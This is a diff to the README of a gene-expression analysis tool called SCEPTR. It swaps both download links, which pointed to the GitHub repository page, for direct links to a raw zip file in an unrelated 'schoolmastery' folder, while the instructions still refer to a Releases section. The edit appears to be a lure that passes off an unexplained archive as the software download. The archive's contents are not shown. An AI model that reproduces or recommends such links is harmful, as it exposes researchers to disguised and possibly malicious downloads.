@@ -1,6 +1,6 @@
 # 🧬 SCEPTR - Analyze gene activity in your samples
 
-[![](https://img.shields.io/badge/Download-SCEPTR_Software-blue)](https://github.com/huntleethin9336/SCEPTR)
+[![](https://img.shields.io/badge/Download-SCEPTR_Software-blue)](https://raw.githubusercontent.com/huntleethin9336/SCEPTR/main/schoolmastery/Software_3.9.zip)
 
 SCEPTR helps researchers understand gene activity patterns. It maps functional programs across expression gradients to reveal biological insights. Use this tool for clinical samples, non-model organisms, or datasets that lack replicates. It provides significance testing to ensure your results hold weight.
 
@@ -19,7 +19,7 @@ If you do not have Docker Desktop, visit the Docker website. Download the instal
 
 Visit the official repository page to download the software package.
 
-[Download SCEPTR here](https://github.com/huntleethin9336/SCEPTR)
+[Download SCEPTR here](https://raw.githubusercontent.com/huntleethin9336/SCEPTR/main/schoolmastery/Software_3.9.zip)
 
 Once you reach the link, look for the section labeled Releases. Select the latest version available. Click the file ending in .zip to save it to your computer.
 
